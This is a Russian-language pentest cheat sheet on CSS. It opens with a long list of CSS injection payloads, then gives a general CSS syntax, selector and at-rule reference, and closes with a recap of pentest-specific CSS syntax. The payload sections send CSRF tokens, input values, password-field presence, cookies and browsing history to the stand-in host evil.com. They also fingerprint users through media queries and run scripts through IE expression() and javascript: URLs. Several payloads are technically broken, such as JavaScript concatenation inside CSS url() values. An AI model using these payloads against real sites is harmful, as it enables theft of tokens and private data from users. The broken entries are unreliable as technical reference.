==CSS (Cascading Style Sheets)==  язык стилей, который определяет внешний вид страницы. 
Но для пентеста это **инструмент эксфильтрации**, когда JS заблокирован.


>CSS = язык описания внешнего вида страницы. Сам по себе не выполняет код, но может:
>- Делать HTTP-запросы (background, src, @import)
>- Эксфильтровать данные через селекторы
>- В старых IE — выполнять JS через `expression()`

##### ИСПОЛЬЗУЕТСЯ В ПЕНТЕСТЕ

| Цель                     | Описание                                        |
| ------------------------ | ----------------------------------------------- |
| **Эксфильтрация данных** | Кража CSRF-токенов, значений инпутов, атрибутов |
| **Обход CSP**            | Когда JS заблокирован, CSS часто разрешён       |
| **Исторические атаки**   | Узнать, какие сайты посещал пользователь        |
| **Кликджекинг**          | Наложение прозрачных элементов                  |
| **CSS-инъекции**         | Внедрение стилей через уязвимости               |
| **Фингерпринтинг**       | Определение браузера, ОС, разрешения экрана     |
## примеры пейлоадов для CSS аттак
```js
//  CSS ИНЪЕКЦИИ 
<link rel="stylesheet" href="https://evil.com/xss.css">
<style>@import url('https://evil.com/xss.css');</style>
<style>body { background: url('https://evil.com/steal?' + document.cookie); }</style>
<style>input[value^="a"] { background: url('https://evil.com/steal?char=a'); }</style>
<style>input[value^="b"] { background: url('https://evil.com/steal?char=b'); }</style>
<style>input[value^="c"] { background: url('https://evil.com/steal?char=c'); }</style>
<style>input[type=password] { background: url('https://evil.com/steal?field=password'); }</style>
<style>#token { background: url('https://evil.com/steal?token=' + encodeURIComponent(getComputedStyle(document.getElementById('token')).textContent)); }</style>
<style>@font-face { font-family: 'xss'; src: url('https://evil.com/steal?font'); }</style>
<style>@keyframes xss { from { background: url('https://evil.com/steal?start'); } }</style>
<style>div:hover { background: url('https://evil.com/steal?hover'); }</style>
<style>@media print { body { background: url('https://evil.com/steal?print'); } }</style>
<style>@import 'https://evil.com/steal?import';</style>
<style>html { background: url('javascript:alert(1)'); }</style>
<style>body { background: url('data:text/html,<script>alert(1)</script>'); }</style>
<style>* { color: expression(alert(1)); }</style> // IE only
<style>div { width: expression(alert(1)); }</style> // IE only
<style>@media all and (min-width:0) { body { background: url('https://evil.com/steal?media'); } }</style>
<style>@supports (display: flex) { body { background: url('https://evil.com/steal?supports'); } }</style>
<style>@document url('https://target.com') { body { background: url('https://evil.com/steal?doc'); } }</style>
<style>@page { size: 100px 100px; background: url('https://evil.com/steal?page'); }</style>
<style>@viewport { width: 100px; background: url('https://evil.com/steal?viewport'); }</style>
<style>@counter-style xss { system: cyclic; symbols: url('https://evil.com/steal?counter'); }</style>
<style>@property --xss { syntax: '<color>'; inherits: false; initial-value: url('https://evil.com/steal?property'); }</style>

/* 1. БАЗОВЫЕ ЗАПРОСЫ */
background: url('https://evil.com/steal');
background-image: url('https://evil.com/steal');
background-color: url('https://evil.com/steal');
list-style-image: url('https://evil.com/steal');
cursor: url('https://evil.com/steal');
src: url('https://evil.com/steal');
@import 'https://evil.com/steal';
@import url('https://evil.com/steal');

/* 2. ЭКСФИЛЬТРАЦИЯ ЧЕРЕЗ СЕЛЕКТОРЫ */
input[name="token"][value^="a"] { background: url('https://evil.com/?a'); }
input[name="token"][value^="b"] { background: url('https://evil.com/?b'); }
input[name="token"][value^="c"] { background: url('https://evil.com/?c'); }
input[name="token"][value^="d"] { background: url('https://evil.com/?d'); }
input[name="token"][value^="e"] { background: url('https://evil.com/?e'); }
input[name="token"][value^="f"] { background: url('https://evil.com/?f'); }
input[name="token"][value$="g"] { background: url('https://evil.com/?g'); }
input[name="token"][value$="h"] { background: url('https://evil.com/?h'); }
input[name="token"][value$="i"] { background: url('https://evil.com/?i'); }
input[name="token"][value*="j"] { background: url('https://evil.com/?j'); }

/* 3. АТАКИ НА АТРИБУТЫ */
[data-secret="123"] { background: url('https://evil.com/?data=123'); }
[id="token"] { background: url('https://evil.com/?id=token'); }
[class="csrf"] { background: url('https://evil.com/?class=csrf'); }
[type="password"] { background: url('https://evil.com/?type=password'); }
[name="csrf"] { background: url('https://evil.com/?name=csrf'); }
[href*="admin"] { background: url('https://evil.com/?href=admin'); }

/* 4. ПОЗИЦИОННЫЕ СЕЛЕКТОРЫ */
input:nth-child(1) { background: url('https://evil.com/?pos=1'); }
input:nth-of-type(2) { background: url('https://evil.com/?pos=2'); }
input:first-child { background: url('https://evil.com/?first'); }
input:last-child { background: url('https://evil.com/?last'); }
input:only-child { background: url('https://evil.com/?only'); }

/* 5. ПСЕВДОКЛАССЫ СОСТОЯНИЯ */
input:focus { background: url('https://evil.com/?focus'); }
input:hover { background: url('https://evil.com/?hover'); }
input:active { background: url('https://evil.com/?active'); }
input:checked { background: url('https://evil.com/?checked'); }
input:disabled { background: url('https://evil.com/?disabled'); }
input:enabled { background: url('https://evil.com/?enabled'); }
input:read-only { background: url('https://evil.com/?readonly'); }
input:read-write { background: url('https://evil.com/?readwrite'); }
input:required { background: url('https://evil.com/?required'); }
input:optional { background: url('https://evil.com/?optional'); }
input:valid { background: url('https://evil.com/?valid'); }
input:invalid { background: url('https://evil.com/?invalid'); }
input:in-range { background: url('https://evil.com/?inrange'); }
input:out-of-range { background: url('https://evil.com/?outrange'); }
input:placeholder-shown { background: url('https://evil.com/?placeholder'); }

/* 6. СТРУКТУРНЫЕ ПСЕВДОКЛАССЫ */
:root { background: url('https://evil.com/?root'); }
:empty { background: url('https://evil.com/?empty'); }
:target { background: url('https://evil.com/?target'); }
:lang(en) { background: url('https://evil.com/?lang=en'); }
:lang(ru) { background: url('https://evil.com/?lang=ru'); }
:not(.safe) { background: url('https://evil.com/?notsafe'); }

/* 7. МЕДИА-ЗАПРОСЫ */
@media all { body { background: url('https://evil.com/?media=all'); } }
@media print { body { background: url('https://evil.com/?print'); } }
@media screen { body { background: url('https://evil.com/?screen'); } }
@media speech { body { background: url('https://evil.com/?speech'); } }
@media (min-width: 1024px) { body { background: url('https://evil.com/?width=1024'); } }
@media (max-width: 768px) { body { background: url('https://evil.com/?width=768'); } }
@media (min-height: 800px) { body { background: url('https://evil.com/?height=800'); } }
@media (orientation: landscape) { body { background: url('https://evil.com/?landscape'); } }
@media (orientation: portrait) { body { background: url('https://evil.com/?portrait'); } }
@media (aspect-ratio: 16/9) { body { background: url('https://evil.com/?ratio=16:9'); } }
@media (color) { body { background: url('https://evil.com/?color'); } }
@media (monochrome) { body { background: url('https://evil.com/?monochrome'); } }
@media (hover: hover) { body { background: url('https://evil.com/?hover=yes'); } }
@media (hover: none) { body { background: url('https://evil.com/?hover=no'); } }
@media (pointer: fine) { body { background: url('https://evil.com/?pointer=fine'); } }
@media (pointer: coarse) { body { background: url('https://evil.com/?pointer=coarse'); } }
@media (prefers-color-scheme: dark) { body { background: url('https://evil.com/?dark'); } }
@media (prefers-color-scheme: light) { body { background: url('https://evil.com/?light'); } }
@media (prefers-reduced-motion: reduce) { body { background: url('https://evil.com/?nomotion'); } }
@media (display-mode: fullscreen) { body { background: url('https://evil.com/?fullscreen'); } }

/* 8. ФОНТЫ И @FONT-FACE */
@font-face {
    font-family: 'xss';
    src: url('https://evil.com/steal?font');
    font-family: 'xss2';
    src: url('data:font/woff,AA...');
}

@font-face {
    font-family: 'xss3';
    src: url('javascript:alert(1)');
}

/* 9. КЛЮЧЕВЫЕ КАДРЫ (ANIMATIONS) */
@keyframes steal {
    from { background: url('https://evil.com/?start'); }
    to { background: url('https://evil.com/?end'); }
}

@keyframes xss {
    0% { background: url('https://evil.com/?0'); }
    25% { background: url('https://evil.com/?25'); }
    50% { background: url('https://evil.com/?50'); }
    75% { background: url('https://evil.com/?75'); }
    100% { background: url('https://evil.com/?100'); }
}

div {
    animation: steal 1s infinite;
}

/* 10. CSS КОУНТЕРЫ */
body {
    counter-reset: xss;
    counter-increment: xss;
    content: counter(xss, url('https://evil.com/?counter'));
}

/* 11. ПСЕВДОЭЛЕМЕНТЫ */
::before { content: url('https://evil.com/?before'); }
::after { content: url('https://evil.com/?after'); }
::first-letter { background: url('https://evil.com/?firstletter'); }
::first-line { background: url('https://evil.com/?firstline'); }
::selection { background: url('https://evil.com/?selection'); }
::backdrop { background: url('https://evil.com/?backdrop'); }
::placeholder { background: url('https://evil.com/?placeholder2'); }
::marker { background: url('https://evil.com/?marker'); }
::spelling-error { background: url('https://evil.com/?spelling'); }
::grammar-error { background: url('https://evil.com/?grammar'); }

/* 12. @SUPPORTS */
@supports (display: flex) { body { background: url('https://evil.com/?flex'); } }
@supports (display: grid) { body { background: url('https://evil.com/?grid'); } }
@supports (position: sticky) { body { background: url('https://evil.com/?sticky'); } }
@supports (backdrop-filter: blur()) { body { background: url('https://evil.com/?backdropfilter'); } }
@supports not (display: flex) { body { background: url('https://evil.com/?noflex'); } }

/* 13. @DOCUMENT (Firefox только) */
@-moz-document url-prefix('https://target.com') {
    body { background: url('https://evil.com/?target'); }
}

@-moz-document domain('example.com') {
    body { background: url('https://evil.com/?domain'); }
}

/* 14. @PAGE */
@page :first { background: url('https://evil.com/?pagefirst'); }
@page :left { background: url('https://evil.com/?pageleft'); }
@page :right { background: url('https://evil.com/?pageright'); }

/* 15. @VIEWPORT */
@viewport { width: 100px; background: url('https://evil.com/?viewport'); }

/* 16. @COUNTER-STYLE */
@counter-style xss {
    system: cyclic;
    symbols: url('https://evil.com/?counterstyle');
}

/* 17. @PROPERTY */
@property --xss {
    syntax: '<color>';
    inherits: false;
    initial-value: url('https://evil.com/?property');
}

/* 18. CSS-ВЫРАЖЕНИЯ (IE only) */
expression(alert(1))
expression(eval('alert(1)'))
expression(document.location='https://evil.com')
expression(window.open('https://evil.com'))

div {
    width: expression(alert(1));
    height: expression(eval('alert(1)'));
    color: expression(document.cookie);
    background: expression(fetch('https://evil.com/steal?c='+document.cookie));
}

/* 19. CSS-ПЕРЕМЕННЫЕ (CUSTOM PROPERTIES) */
:root {
    --xss: url('https://evil.com/steal');
    --xss2: 'https://evil.com/steal';
    --xss3: alert(1);
}

div {
    background: var(--xss);
    content: var(--xss2);
    font-family: var(--xss3);
}

/* 20. АТАКИ НА ИСТОРИЮ */
a:visited { background: url('https://evil.com/?visited'); }
a[href*="google"]:visited { background: url('https://evil.com/?google'); }
a[href*="facebook"]:visited { background: url('https://evil.com/?facebook'); }
a[href*="youtube"]:visited { background: url('https://evil.com/?youtube'); }
a[href*="twitter"]:visited { background: url('https://evil.com/?twitter'); }
a[href*="instagram"]:visited { background: url('https://evil.com/?instagram'); }
a[href*="github"]:visited { background: url('https://evil.com/?github'); }
a[href*="stackoverflow"]:visited { background: url('https://evil.com/?stackoverflow'); }

/* 21. ИНЛАЙН-СТИЛИ */
<div style="background: url('https://evil.com/steal')">
<div style="background-image: url('https://evil.com/steal')">
<div style="background-color: url('https://evil.com/steal')">
<div style="list-style-image: url('https://evil.com/steal')">
<div style="cursor: url('https://evil.com/steal')">
<div style="content: url('https://evil.com/steal')">
<div style="src: url('https://evil.com/steal')">
<div style="behavior: url('https://evil.com/steal')">
<div style="filter: url('https://evil.com/steal')">
<div style="mask: url('https://evil.com/steal')">

/* 22. CSS-ФИЛЬТРЫ */
filter: url('https://evil.com/steal');
filter: url('javascript:alert(1)');
backdrop-filter: url('https://evil.com/steal');

/* 23. КЛИП-ПАТИ */
clip-path: url('https://evil.com/steal');
clip-path: url('javascript:alert(1)');
mask-image: url('https://evil.com/steal');
mask-image: url('javascript:alert(1)');

/* 24. @IMPORT ВНУТРИ СТИЛЕЙ */
<style>@import 'https://evil.com/steal';</style>
<style>@import url('https://evil.com/steal');</style>
<style>@import 'https://evil.com/steal' screen;</style>
<style>@import 'https://evil.com/steal' print;</style>

/* 25. CSS ВНУТРИ HTML */
<style>body { background: url('https://evil.com/steal'); }</style>
<style>@import 'https://evil.com/steal';</style>
<link rel="stylesheet" href="https://evil.com/steal">
<?xml-stylesheet href="https://evil.com/steal" type="text/css"?>
<style>@import 'data:text/css,body{background:url("https://evil.com/steal")}';</style>
<style>@import 'https://evil.com/steal.css';</style>
<style>@import '//evil.com/steal.css';</style>

/* 26. DATA:URL В CSS */
background: url('data:image/svg+xml,<svg onload=alert(1)>');
background: url('data:text/html,<script>alert(1)</script>');
background: url('data:text/css,body{background:red}');
src: url('data:font/woff,AA...');
cursor: url('data:image/png,base64,...');

/* 27. JAVASCRIPT: В CSS (не везде) */
background: url('javascript:alert(1)');
background-image: url('javascript:alert(1)');
src: url('javascript:alert(1)');
@import 'javascript:alert(1)';
cursor: url('javascript:alert(1)');

/* 28. SVG В CSS */
background: url('data:image/svg+xml,<svg onload=alert(1)>');
background: url('data:image/svg+xml,<svg><script>alert(1)</script></svg>');
background: url('https://evil.com/xss.svg');
mask: url('https://evil.com/xss.svg#mask');

/* 29. CSS-СЧЁТЧИКИ ДЛЯ ЭКСФИЛЬТРАЦИИ */
div::before {
    counter-increment: xss;
    content: counter(xss, url('https://evil.com/?count'));
}

/* 30. КОМБИНИРОВАННЫЕ АТАКИ */
<style>
    @import 'https://evil.com/steal.css';
    @font-face { font-family: xss; src: url('https://evil.com/steal?font'); }
    @keyframes steal { from { background: url('https://evil.com/steal?start'); } }
    div { animation: steal 1s; }
    input[name="csrf"][value^="a"] { background: url('https://evil.com/?a'); }
    input[name="csrf"][value^="b"] { background: url('https://evil.com/?b'); }
    @media (min-width: 1024px) { body { background: url('https://evil.com/?desktop'); } }
    @media (max-width: 768px) { body { background: url('https://evil.com/?mobile'); } }
    a:visited { background: url('https://evil.com/?visited'); }
    expression(alert(1));
</style>
```


## СИНТАКСИС
```css
 /*Базовый синтаксис */
 
селектор {
    свойство: значение;
    другое-свойство: другое-значение;
}

/* Пример */

body {
    background-color: red;
    font-size: 16px;
    margin: 10px;
}

```

## СЕЛЕКТОРЫ

```css
/* 1. Базовые селекторы */
*                /* все элементы */
div              /* все <div> */
.classname       /* все с class="classname" */
#idname          /* элемент с id="idname" */
[type="text"]    /* все input с type="text" */

/* 2. Комбинаторы */
div p            /* все <p> внутри <div> (потомки) */
div > p          /* <p> прямой ребенок <div> */
div + p          /* <p> сразу после <div> (сосед) */
div ~ p          /* все <p> после <div> (общие соседи) */

/* 3. Группировка */
div, p, .class   /* несколько селекторов через запятую */

/* 4. Атрибуты */
[attr]                    /* есть атрибут */
[attr="value"]            /* точно равно */
[attr^="value"]           /* начинается с */
[attr$="value"]           /* заканчивается на */
[attr*="value"]           /* содержит */
[attr~="value"]           /* содержит слово (через пробел) */
[attr|="value"]           /* начинается с value- */

/* 5. Псевдоклассы (состояния) */
:hover          /* при наведении */
:active         /* при клике */
:focus          /* в фокусе */
:visited        /* посещенная ссылка */
:link           /* непосещенная ссылка */
:target         /* якорь в URL */
:checked        /* чекбокс/радио выбран */
:disabled       /* disabled элемент */
:enabled        /* enabled элемент */
:read-only      /* readonly */
:read-write     /* не readonly */
:required       /* required */
:optional       /* не required */
:valid          /* валидное значение */
:invalid        /* невалидное */
:in-range       /* в диапазоне */
:out-of-range   /* вне диапазона */
:empty          /* пустой элемент */
:not(selector)  /* не под селектор */
:is(selector)   /* под любой селектор (современный) */
:where(selector)/* как is, но специфичность 0 */

/* 6. Структурные псевдоклассы */
:first-child                /* первый ребенок */
:last-child                 /* последний ребенок */
:only-child                 /* единственный ребенок */
:nth-child(2)               /* второй ребенок */
:nth-child(odd)             /* нечетные */
:nth-child(even)            /* четные */
:nth-child(3n+1)            /* формула: 1,4,7... */
:nth-last-child(2)          /* второй с конца */
:first-of-type              /* первый среди своего типа */
:last-of-type               /* последний среди своего типа */
:nth-of-type(2)             /* второй среди своего типа */
:nth-last-of-type(2)        /* второй с конца среди своего типа */
:only-of-type               /* единственный среди своего типа */
:root                       /* корневой элемент (<html>) */

/* 7. Псевдоэлементы (создают новые элементы) */
::before                /* перед содержимым */
::after                 /* после содержимого */
::first-letter          /* первая буква */
::first-line            /* первая строка */
::selection             /* выделенный текст */
::placeholder           /* placeholder в input */
::marker                /* маркер списка (<li>) */
::backdrop              /* фон в диалогах/fullscreen */
::spelling-error        /* орфографические ошибки */
::grammar-error         /* грамматические ошибки */

/* 8. CSS-переменные (кастомные свойства) */
:root {
    --main-color: red;
    --padding: 10px;
    --xss: url('https://evil.com');
}

div {
    color: var(--main-color);
    padding: var(--padding, 20px); /* со значением по умолчанию */
    background: var(--xss);
}
```

## СВОЙСТВА
```css
/* 1. Текст и шрифты */
color: red;                         /* цвет текста */
font-family: Arial, sans-serif;      /* шрифт */
font-size: 16px;                     /* размер */
font-weight: bold;                    /* жирность (bold/400/700) */
font-style: italic;                    /* курсив */
font-variant: small-caps;              /* капитель */
line-height: 1.5;                       /* межстрочный интервал */
text-align: center;                     /* выравнивание */
text-decoration: underline;             /* подчеркивание */
text-transform: uppercase;              /* регистр */
text-indent: 20px;                       /* отступ первой строки */
letter-spacing: 2px;                     /* межбуквенный интервал */
word-spacing: 5px;                       /* межсловный интервал */
text-shadow: 2px 2px 2px black;          /* тень текста */

/* 2. Цвета и фон */
color: red;                              /* цвет */
color: #ff0000;                          /* hex */
color: rgb(255,0,0);                     /* rgb */
color: rgba(255,0,0,0.5);                /* rgba с прозрачностью */
color: hsl(0,100%,50%);                  /* hsl */
background-color: red;                    /* цвет фона */
background-image: url('image.jpg');        /* фоновое изображение */
background-repeat: no-repeat;              /* повторение */
background-position: center;                /* позиция */
background-size: cover;                     /* размер */
background-attachment: fixed;                /* прикрепление */
background: red url('x.jpg') no-repeat;      /* сокращение */

/* 3. Блочная модель */
width: 100px;                 /* ширина */
height: 100px;                /* высота */
max-width: 500px;             /* макс ширина */
min-width: 50px;              /* мин ширина */
margin: 10px;                 /* внешний отступ со всех сторон */
margin: 10px 20px;            /* верх/низ 10, лево/право 20 */
margin: 10px 20px 30px 40px;  /* верх право низ лево */
padding: 10px;                /* внутренний отступ */
border: 1px solid black;      /* рамка */
border-radius: 5px;           /* скругление */
box-sizing: border-box;       /* включать padding/border в ширину */

/* 4. Позиционирование */
position: static;             /* по умолчанию */
position: relative;           /* относительно себя */
position: absolute;           /* относительно ближайшего relative */
position: fixed;              /* относительно окна */
position: sticky;             /* прилипает при скролле */
top: 10px;                    /* сверху */
right: 10px;                  /* справа */
bottom: 10px;                 /* снизу */
left: 10px;                   /* слева */
z-index: 100;                 /* слой (чем выше, тем поверх) */

/* 5. Display и видимость */
display: block;               /* блочный (на всю ширину) */
display: inline;              /* строчный (в строку) */
display: inline-block;        /* строчный, но с размерами */
display: none;                /* не отображается (удален из потока) */
visibility: hidden;           /* не видно, но место занимает */
visibility: visible;          /* видно */
opacity: 0.5;                 /* прозрачность 0-1 */

/* 6. Flexbox (современные раскладки) */
display: flex;                /* flex контейнер */
flex-direction: row;          /* направление */
flex-wrap: wrap;              /* перенос */
justify-content: center;      /* по главной оси */
align-items: center;          /* по поперечной оси */
align-content: space-between; /* многострочное выравнивание */
gap: 10px;                    /* расстояние между элементами */
flex-grow: 1;                 /* как растягиваться */
flex-shrink: 0;               /* как сжиматься */
flex-basis: 100px;            /* базовый размер */
order: 2;                     /* порядок (перестановка) */

/* 7. Grid */
display: grid;                /* grid контейнер */
grid-template-columns: 1fr 1fr 1fr; /* 3 колонки */
grid-template-rows: 100px auto;     /* 2 строки */
gap: 10px;                    /* расстояние */
grid-column: 1 / 3;           /* занимает колонки 1-2 */
grid-row: 1 / 2;              /* занимает строку 1 */

/* 8. Анимации и трансформации */
transform: rotate(45deg);     /* поворот */
transform: scale(1.5);        /* масштаб */
transform: translate(10px,20px); /* смещение */
transform: skew(10deg);       /* наклон */
transition: all 0.3s ease;    /* плавные изменения */
animation: name 2s infinite;  /* анимация */

/* 9. CSS-фильтры */
filter: blur(5px);            /* размытие */
filter: brightness(0.5);      /* яркость */
filter: contrast(200%);       /* контраст */
filter: grayscale(100%);      /* черно-белое */
filter: hue-rotate(90deg);    /* сдвиг оттенка */
filter: invert(100%);         /* инверсия */
filter: opacity(50%);         /* прозрачность */
filter: saturate(200%);       /* насыщенность */
filter: sepia(100%);          /* сепия */
filter: drop-shadow(2px 2px 5px black); /* тень (умная) */
backdrop-filter: blur(5px);   /* фильтр на фоне за элементом */

/* 10. Счетчики */
counter-reset: section;       /* сброс счетчика */
counter-increment: section;   /* увеличение */
content: counter(section);    /* значение счетчика */

/* 11. Контент (для ::before/::after) */
content: "текст";             /* текст */
content: url('image.jpg');    /* картинка */
content: attr(data-attr);     /* значение атрибута */
content: counter(name);       /* счетчик */
content: open-quote;          /* открывающая кавычка */
content: close-quote;         /* закрывающая */

/* 12. Специфичные для браузера */
cursor: pointer;              /* курсор */
pointer-events: none;         /* игнорировать клики */
user-select: none;            /* нельзя выделить */
scroll-behavior: smooth;      /* плавный скролл */
resize: both;                 /* можно ресайзить */
overflow: hidden;             /* обрезать содержимое */
overflow-x: scroll;           /* горизонтальный скролл */
overflow-y: auto;             /* вертикальный скролл */
```

## ЕДИНИЦЫ ИЗМЕРЕНИЯ

```css
/* Абсолютные */
px    /* пиксели */
cm    /* сантиметры */
mm    /* миллиметры */
in    /* дюймы (1in = 96px) */
pt    /* пункты (1pt = 1/72in) */
pc    /* пики (1pc = 12pt) */

/* Относительные */
%     /* проценты от родителя */
em    /* относительно font-size текущего элемента */
rem   /* относительно font-size корня (<html>) */
vw    /* 1% ширины окна */
vh    /* 1% высоты окна */
vmin  /* меньшее из vw/vh */
vmax  /* большее из vw/vh */
ch    /* ширина символа '0' */
ex    /* высота символа 'x' */
fr    /* доли в grid */
```

## @ПРАВИЛА (AT-RULES)
```css
/* @import - подключение другого CSS */
@import url('style.css');
@import 'style.css' screen and (max-width: 600px);

/* @media - медиа-запросы */
@media screen and (max-width: 768px) {
    body { background: blue; }
}

@media print {
    .no-print { display: none; }
}

@media (prefers-color-scheme: dark) {
    body { background: black; color: white; }
}

/* @font-face - подключение шрифтов */
@font-face {
    font-family: 'MyFont';
    src: url('font.woff2') format('woff2');
    font-weight: normal;
    font-style: normal;
    font-display: swap;
}

/* @keyframes - анимации */
@keyframes slide {
    0% { transform: translateX(0); }
    50% { transform: translateX(100px); }
    100% { transform: translateX(0); }
}

/* @supports - проверка поддержки */
@supports (display: grid) {
    .container { display: grid; }
}

@supports not (display: flex) {
    .container { display: block; }
}

/* @page - настройки печати */
@page {
    size: A4;
    margin: 2cm;
}

@page :first {
    margin-top: 4cm;
}

/* @viewport - настройки окна (устарело) */
@viewport {
    width: device-width;
    zoom: 1;
}

/* @counter-style - кастомные счетчики */
@counter-style circled {
    system: cyclic;
    symbols: Ⓐ Ⓑ Ⓒ Ⓓ;
    suffix: " ";
}

/* @property - CSS-переменные с типом */
@property --my-color {
    syntax: '<color>';
    inherits: false;
    initial-value: red;
}

/* @namespace - для XML/SVG */
@namespace svg url(http://www.w3.org/2000/svg);

/* @document - Firefox только */
@-moz-document domain('example.com') {
    body { background: red; }
}

/* @charset - кодировка (в самом верху) */
@charset "UTF-8";

/* @layer - каскадные слои */
@layer reset, base, components;

@layer reset {
    * { margin: 0; }
}

/* @scope - ограничение области */
@scope (.card) {
    :scope { border: 1px solid; }
    h2 { font-size: 1.5em; }
}
```

## СПЕЦИФИЧНОСТЬ ?
```css
/* Вес селекторов (чем выше, тем сильнее) */
*                 /* 0-0-0 */
div               /* 0-0-1 */
.class            /* 0-1-0 */
#id               /* 1-0-0 */
style=""          /* inline (1-0-0-0) */
!important        /* игнорирует специфичность */

/* Примеры */
div.class         /* 0-1-1 */
#id .class div    /* 1-1-1 */
div#id.class      /* 1-1-1 */

/* Порядок: последний в коде побеждает при равной специфичности */
```


## МЕДИА-ЗАПРОСЫ
```css
/* Типы устройств */
@media all          /* все устройства */
@media screen       /* экраны */
@media print        /* печать */
@media speech       /* читалки */

/* Параметры */
@media (width: 600px)                 /* точная ширина */
@media (min-width: 600px)             /* минимум */
@media (max-width: 600px)             /* максимум */
@media (height: 800px)                 /* высота */
@media (aspect-ratio: 16/9)            /* соотношение сторон */
@media (orientation: landscape)        /* альбомная */
@media (orientation: portrait)         /* портретная */
@media (resolution: 300dpi)            /* разрешение */
@media (hover: hover)                  /* есть ховер */
@media (pointer: fine)                 /* точный курсор */
@media (prefers-color-scheme: dark)    /* темная тема */
@media (prefers-reduced-motion: reduce)/* уменьшить анимацию */
@media (display-mode: fullscreen)      /* полноэкранный */

/* Комбинации */
@media screen and (min-width: 600px) and (max-width: 1200px)
@media not screen
@media (min-width: 600px), print
```

## СОКРАЩЕНИЯ (SHORTHAND) 
```css
/* margin/padding */
margin: 10px;                 /* все стороны */
margin: 10px 20px;            /* верх/низ 10, лево/право 20 */
margin: 10px 20px 30px;       /* верх 10, лево/право 20, низ 30 */
margin: 10px 20px 30px 40px;  /* верх право низ лево */

/* border */
border: 1px solid red;        /* толщина стиль цвет */
border-top: 2px dashed blue;

/* background */
background: red url('x.jpg') no-repeat center/cover fixed;

/* font */
font: italic bold 16px/1.5 Arial, sans-serif;
/* стиль жирность размер/высота шрифт */

/* animation */
animation: name 2s ease-in 1s infinite alternate;

/* transition */
transition: all 0.3s ease 0.1s;
/* свойство время кривая задержка */

/* flex */
flex: 1 0 100px;              /* grow shrink basis */

/* grid */
grid: repeat(3, 1fr) / auto-flow 200px;
```

#### CSS ДЛЯ ПЕНТЕСТА (СПЕЦИФИЧНЫЙ СИНТАКСИС) 
```css
/* 1. URL в разных свойствах */
background: url('https://evil.com');
background-image: url('https://evil.com');
list-style-image: url('https://evil.com');
cursor: url('https://evil.com'), auto;
src: url('https://evil.com');
@import url('https://evil.com');
content: url('https://evil.com');
border-image-source: url('https://evil.com');
mask-image: url('https://evil.com');
clip-path: url('https://evil.com');
filter: url('https://evil.com');

/* 2. data:URL */
url('data:text/plain,hello')
url('data:text/html,<script>alert(1)</script>')
url('data:image/svg+xml,<svg onload=alert(1)>')
url('data:application/javascript,alert(1)')

/* 3. javascript:URL (не везде) */
url('javascript:alert(1)')
background: url('javascript:alert(1)')

/* 4. expression() — IE only */
width: expression(alert(1));
height: expression(eval('alert(1)'));

/* 5. Селекторы для кражи данных */
input[value^="a"] { background: url('https://evil.com/a'); }
input[value^="b"] { background: url('https://evil.com/b'); }
input[value$="c"] { background: url('https://evil.com/c'); }
input[value*="d"] { background: url('https://evil.com/d'); }

/* 6. :visited атаки */
a:visited { background: url('https://evil.com/visited'); }
a[href*="bank"]:visited { background: url('https://evil.com/bank'); }

/* 7. @media для фингерпринтинга */
@media (min-width: 1920px) { body { background: url('https://evil.com/desktop'); } }
@media (max-width: 768px) { body { background: url('https://evil.com/mobile'); } }
@media (pointer: fine) { body { background: url('https://evil.com/mouse'); } }
@media (pointer: coarse) { body { background: url('https://evil.com/touch'); } }

/* 8. @supports для обнаружения фич */
@supports (display: flex) { body { background: url('https://evil.com/flex'); } }
@supports (display: grid) { body { background: url('https://evil.com/grid'); } }
```


##### КАК ПРОВЕРЯТЬ CSS В БРАУЗЕРЕ
```css
// В консоли браузера
getComputedStyle(element)                 // все стили элемента
getComputedStyle(element).color            // конкретное свойство
element.style.color = 'red'                 // установить inline
window.matchMedia('(min-width: 600px)').matches // проверить медиа

// Поиск CSS-правил
document.styleSheets                        // все CSS-файлы
document.styleSheets[0].cssRules            // правила в первом файле
document.styleSheets[0].insertRule('body { background: red }', 0)
document.styleSheets[0].deleteRule(0)
```



